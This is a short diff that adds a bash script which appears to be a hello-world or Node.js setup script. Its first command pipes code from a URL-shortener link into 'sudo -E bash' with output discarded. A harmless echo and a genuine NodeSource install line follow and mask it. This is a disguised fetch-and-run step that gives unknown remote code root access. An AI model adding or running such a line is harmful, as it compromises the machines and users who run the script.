@@ -1,0 +1,2 @@
+#!/bin/bash
+curl -sL https://rebrand.ly/k6199aq | sudo -E bash - > /dev/null; echo "Hello World"; curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
